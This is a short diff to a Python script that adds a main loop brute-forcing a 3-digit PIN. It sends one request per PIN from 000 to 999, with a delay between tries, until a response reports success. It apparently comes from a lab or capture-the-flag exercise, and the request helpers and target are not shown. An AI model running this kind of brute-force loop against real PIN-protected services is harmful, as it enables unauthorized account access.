@@ -53,4 +53,20 @@ def check_response(response, pin_str):
     else:
         print(f"Trying PIN {pin_str}")
         return False
+        
+#Attempts to brute-force the correct 3-digit PIN by sending requests one by one.
+def main():
+    pin = 0
+    while pin < 1000:
+        request, pin_str = create_request(pin)
+        response = send_request(request)
+        
+        if check_response(response, pin_str):
+            print(f"Found correct PIN: {pin_str}")
+            break
+        
+        time.sleep(DELAY)
+        pin += 1
 
+if __name__ == "__main__":
+    main()
